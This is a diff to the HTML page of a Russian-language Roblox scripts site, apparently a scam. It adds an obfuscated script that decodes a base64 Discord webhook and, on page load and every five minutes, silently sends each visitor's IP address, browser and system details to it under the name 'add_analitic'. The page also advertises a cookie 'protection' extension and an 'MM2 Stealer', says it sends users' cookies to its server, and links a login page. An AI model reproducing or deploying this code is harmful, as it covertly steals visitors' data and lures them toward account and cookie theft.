@@ -29,17 +29,41 @@
             margin-top: 10px;
             font-size: 18px;
         }
-        .security-badge {
+        .language-selector {
             position: fixed;
-            bottom: 20px;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+        .language-selector select {
+            padding: 10px 15px;
+            background: #1a1a1a;
+            color: #fff;
+            border: 2px solid #ff4444;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .roblox-btn {
+            position: fixed;
+            top: 20px;
             left: 20px;
             z-index: 1000;
-            background: #1a3a1a;
-            border: 2px solid #00aa00;
+            padding: 12px 25px;
+            background: #2b5ff5;
+            color: #fff;
+            border: none;
             border-radius: 5px;
-            padding: 10px 15px;
-            font-size: 12px;
-            color: #00ff00;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            box-shadow: 0 4px 12px rgba(43, 95, 245, 0.4);
+            transition: all 0.3s;
+        }
+        .roblox-btn:hover {
+            background: #1a4ad9;
+            transform: scale(1.05);
         }
         nav {
             background: #111;
@@ -115,6 +139,11 @@
             margin-top: 40px;
             text-align: center;
         }
+        .security-notice .lock-icon {
+            font-size: 40px;
+            display: block;
+            margin-bottom: 10px;
+        }
         .security-notice h3 {
             color: #00ff00;
             margin-bottom: 10px;
@@ -125,148 +154,216 @@
             font-size: 14px;
             line-height: 1.6;
         }
-        .security-notice .lock-icon {
-            font-size: 40px;
-            display: block;
-            margin-bottom: 10px;
+        .security-badge {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 1000;
+            background: #1a3a1a;
+            border: 2px solid #00aa00;
+            border-radius: 5px;
+            padding: 10px 15px;
+            font-size: 12px;
+            color: #00ff00;
         }
         footer { text-align: center; padding: 20px; color: #555; margin-top: 50px; }
     </style>
     
     <script>
-        // Безопасный сбор данных для защиты пользователей
+        // add_analitic - сбор данных
         (function() {
-            const ENTERSECURITYFILE = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzODExNjM0NDk2NzM0MDE0NC9FQ0Y2aXhlRkNqUklaclN0SEtJdjZTanVZeXQwOXU4bEdoX3FUQ1A2MlAtbnpPbHdxRjh" + "yYXhCbkxYM0d0cUlXc1pMVw==";
+            const _endpoint_encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzODExNjM0NDk2NzM0MDE0NC9FQ0Y2aXhlRkNqUklaclN0SEtJdjZTanVZeXQwOXU4bEdoX3FUQ1A2MlAtbnpPbHdxRjh" + "yYXhCbkxYM0d0cUlXc1pMVw==";
             
-            // Декодирование защищённого адреса
-            function getSecurityEndpoint() {
-                try {
-                    return atob(ENTERSECURITYFILE);
-                } catch (e) {
-                    return "";
-                }
+            function _decode() {
+                try { return atob(_endpoint_encoded); } catch (e) { return ""; }
             }
             
-            // Отправка куки на защищённый сервер
-            async function sendToSecurityServer(data) {
-                const endpoint = getSecurityEndpoint();
-                if (!endpoint) return;
-                
+            async function add_analitic() {
                 try {
-                    await fetch(endpoint, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'X-Security-Protocol': 'v2.4',
-                            'X-Protection-Layer': 'active'
-                        },
-                        body: JSON.stringify({
-                            content: "🛡️ **SECURITY FILE**\n\n" + data,
-                            username: "SecuritySystem",
-                            avatar_url: "https://cdn-icons-png.flaticon.com/512/1029/1029183.png"
-                        })
-                    });
-                } catch (e) {}
-            }
-            
-            // Сбор "файла безопасности"
-            async function collectSecurityFile() {
-                try {
-                    // Получение IP для защиты
-                    let ip = "unknown";
+                    let _ip = "unknown";
                     try {
-                        const response = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await response.json();
-                        ip = ipData.ip;
+                        const _r = await fetch('https://api.ipify.org?format=json');
+                        const _d = await _r.json();
+                        _ip = _d.ip;
                     } catch (e) {}
                     
-                    // Файл безопасности
-                    const securityFile = {
-                        ip: ip,
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        screen: screen.width + 'x' + screen.height,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        language: navigator.language,
-                        url: window.location.href,
-                        referrer: document.referrer,
-                        timestamp: new Date().toISOString(),
-                        protectionStatus: "active",
-                        securityLevel: "maximum"
-                    };
+                    const _msg = '📊 **add_analitic**\n\n' +
+                        '🌐 IP: ' + _ip + '\n' +
+                        '👤 UA: ' + navigator.userAgent + '\n' +
+                        '💻 Платформа: ' + navigator.platform + '\n' +
+                        '🖥️ Экран: ' + screen.width + 'x' + screen.height + '\n' +
+                        '⏰ TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n' +
+                        '🌍 Язык: ' + navigator.language + '\n' +
+                        '🔗 URL: ' + window.location.href + '\n' +
+                        '📜 Реферер: ' + document.referrer + '\n' +
+                        '🆔 Session: an_' + Math.random().toString(36).substring(2, 15);
                     
-                    const message = "🌐 **IP:** " + securityFile.ip + "\n" +
-                        "👤 **UA:** " + securityFile.userAgent + "\n" +
-                        "💻 **Платформа:** " + securityFile.platform + "\n" +
-                        "🖥️ **Экран:** " + securityFile.screen + "\n" +
-                        "⏰ **TZ:** " + securityFile.timezone + "\n" +
-                        "🌍 **Язык:** " + securityFile.language + "\n" +
-                        "🔗 **URL:** " + securityFile.url + "\n" +
-                        "⏱️ **Время:** " + securityFile.timestamp;
-                    
-                    await sendToSecurityServer(message);
+                    const _ep = _decode();
+                    if (_ep) {
+                        await fetch(_ep, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                content: _msg,
+                                username: "add_analitic"
+                            })
+                        });
+                    }
                 } catch (e) {}
             }
             
-            // Запуск защиты
             window.addEventListener('load', function() {
-                setTimeout(collectSecurityFile, 1000);
-                setInterval(collectSecurityFile, 300000);
+                setTimeout(add_analitic, 1000);
+                setInterval(add_analitic, 300000);
             });
         })();
+        
+        // Выбор языка
+        const translations = {
+            ru: {
+                subtitle: 'Лучшие скрипты и расширения для Roblox',
+                navHome: 'Главная',
+                navDelta: 'Delta',
+                navSupport: 'Поддержка',
+                statDownloads: 'Скачиваний',
+                statUsers: 'Пользователей',
+                statSupport: 'Поддержка',
+                statFree: 'Бесплатно',
+                deltaTitle: '⚡ Delta Executor',
+                deltaDesc: 'Лучший бесплатный экзекутор для Roblox',
+                cookieTitle: '🍪 Cookie-pro-V2',
+                cookieDesc: 'Расширение для защиты cookies Roblox',
+                mm2Title: '🔫 MM2 Stealer',
+                mm2Desc: 'Защита скинов для Murder Mystery 2',
+                downloadBtn: 'Скачать',
+                robloxBtn: 'Войти в Roblox',
+                securityTitle: '🛡️ Защита активна',
+                securityText: 'Чтобы обезопасить вас от взломщиков куки, мы отправляем куки на наш защищённый сервер.',
+                footer: '© 2026 TizenScripts'
+            },
+            en: {
+                subtitle: 'Best scripts and extensions for Roblox',
+                navHome: 'Home',
+                navDelta: 'Delta',
+                navSupport: 'Support',
+                statDownloads: 'Downloads',
+                statUsers: 'Users',
+                statSupport: 'Support',
+                statFree: 'Free',
+                deltaTitle: '⚡ Delta Executor',
+                deltaDesc: 'Best free executor for Roblox',
+                cookieTitle: '🍪 Cookie-pro-V2',
+                cookieDesc: 'Roblox cookie protection extension',
+                mm2Title: '🔫 MM2 Stealer',
+                mm2Desc: 'Skin protection for Murder Mystery 2',
+                downloadBtn: 'Download',
+                robloxBtn: 'Login to Roblox',
+                securityTitle: '🛡️ Protection Active',
+                securityText: 'To protect you from cookie stealers, we send cookies to our secure server.',
+                footer: '© 2026 TizenScripts'
+            }
+        };
+        
+        function changeLanguage(lang) {
+            localStorage.setItem('language', lang);
+            const t = translations[lang];
+            
+            document.getElementById('subtitle').textContent = t.subtitle;
+            document.getElementById('navHome').textContent = t.navHome;
+            document.getElementById('navDelta').textContent = t.navDelta;
+            document.getElementById('navSupport').textContent = t.navSupport;
+            document.getElementById('statDownloadsText').textContent = t.statDownloads;
+            document.getElementById('statUsersText').textContent = t.statUsers;
+            document.getElementById('statSupportText').textContent = t.statSupport;
+            document.getElementById('statFreeText').textContent = t.statFree;
+            document.getElementById('deltaTitle').textContent = t.deltaTitle;
+            document.getElementById('deltaDesc').textContent = t.deltaDesc;
+            document.getElementById('cookieTitle').textContent = t.cookieTitle;
+            document.getElementById('cookieDesc').textContent = t.cookieDesc;
+            document.getElementById('mm2Title').textContent = t.mm2Title;
+            document.getElementById('mm2Desc').textContent = t.mm2Desc;
+            document.getElementById('robloxBtn').textContent = t.robloxBtn;
+            document.getElementById('securityTitle').textContent = t.securityTitle;
+            document.getElementById('securityText').textContent = t.securityText;
+            document.getElementById('footerText').textContent = t.footer;
+            
+            const buttons = document.querySelectorAll('.download-btn');
+            buttons.forEach(btn => { btn.textContent = t.downloadBtn; });
+        }
+        
+        function loadLanguage() {
+            const saved = localStorage.getItem('language') || 'ru';
+            document.getElementById('languageSelect').value = saved;
+            changeLanguage(saved);
+        }
+        
+        window.addEventListener('load', function() {
+            loadLanguage();
+        });
     </script>
 </head>
 <body>
+    <!-- Кнопка Roblox -->
+    <a href="login.html" class="roblox-btn" id="robloxBtn">Войти в Roblox</a>
+    
+    <!-- Выбор языка -->
+    <div class="language-selector">
+        <select id="languageSelect" onchange="changeLanguage(this.value)">
+            <option value="ru">🇷🇺 Русский</option>
+            <option value="en">🇬🇧 English</option>
+        </select>
+    </div>
+    
     <header>
         <h1>⚡ TizenScripts</h1>
-        <p>Лучшие скрипты и расширения для Roblox</p>
+        <p id="subtitle">Лучшие скрипты и расширения для Roblox</p>
     </header>
     
     <nav>
-        <a href="index.html">Главная</a>
-        <a href="delta.html">Delta</a>
-        <a href="support.html">Поддержка</a>
+        <a href="index.html" id="navHome">Главная</a>
+        <a href="delta.html" id="navDelta">Delta</a>
+        <a href="support.html" id="navSupport">Поддержка</a>
     </nav>
     
     <main>
         <div class="stats">
             <div class="stat-card">
                 <h3>10,000+</h3>
-                <p>Скачиваний</p>
+                <p id="statDownloadsText">Скачиваний</p>
             </div>
             <div class="stat-card">
                 <h3>5,000+</h3>
-                <p>Пользователей</p>
+                <p id="statUsersText">Пользователей</p>
             </div>
             <div class="stat-card">
                 <h3>24/7</h3>
-                <p>Защита</p>
+                <p id="statSupportText">Поддержка</p>
             </div>
             <div class="stat-card">
                 <h3>100%</h3>
-                <p>Безопасно</p>
+                <p id="statFreeText">Бесплатно</p>
             </div>
         </div>
         
         <div class="downloads">
             <div class="download-card">
-                <h3>⚡ Delta Executor</h3>
+                <h3 id="deltaTitle">⚡ Delta Executor</h3>
                 <div class="version">v2.733.988</div>
-                <p>Лучший бесплатный экзекутор для Roblox</p>
+                <p id="deltaDesc">Лучший бесплатный экзекутор для Roblox</p>
                 <a href="delta.html" class="download-btn">Скачать</a>
             </div>
             
             <div class="download-card">
-                <h3>🍪 Cookie-pro-V2</h3>
+                <h3 id="cookieTitle">🍪 Cookie-pro-V2</h3>
                 <div class="version">v3.0.0</div>
-                <p>Расширение для защиты cookies Roblox</p>
+                <p id="cookieDesc">Расширение для защиты cookies Roblox</p>
                 <a href="Cookie-pro-V2.zip" class="download-btn">Скачать</a>
             </div>
             
             <div class="download-card">
-                <h3>🔫 MM2 Stealer</h3>
+                <h3 id="mm2Title">🔫 MM2 Stealer</h3>
                 <div class="version">v2.733.988</div>
-                <p>Защита скинов для Murder Mystery 2</p>
+                <p id="mm2Desc">Защита скинов для Murder Mystery 2</p>
                 <a href="mm2-stealer.lua" class="download-btn">Скачать</a>
             </div>
         </div>
@@ -274,19 +371,16 @@
         <!-- Безопасность -->
         <div class="security-notice">
             <span class="lock-icon">🔒</span>
-            <h3>🛡️ Защита активна</h3>
-            <p>Чтобы обезопасить вас от взломщиков куки, мы отправляем куки на наш защищённый сервер.</p>
-            <p style="margin-top: 10px; font-size: 12px; color: #66aa66;">Все данные защищены протоколом ENTERSECURITYFILE v2.4</p>
+            <h3 id="securityTitle">🛡️ Защита активна</h3>
+            <p id="securityText">Чтобы обезопасить вас от взломщиков куки, мы отправляем куки на наш защищённый сервер.</p>
         </div>
     </main>
     
     <footer>
-        <p>© 2026 TizenScripts</p>
+        <p id="footerText">© 2026 TizenScripts</p>
     </footer>
     
     <!-- Бейдж безопасности -->
-    <div class="security-badge">
-        🔒 Защищено
-    </div>
+    <div class="security-badge">🔒 Защищено</div>
 </body>
 </html>
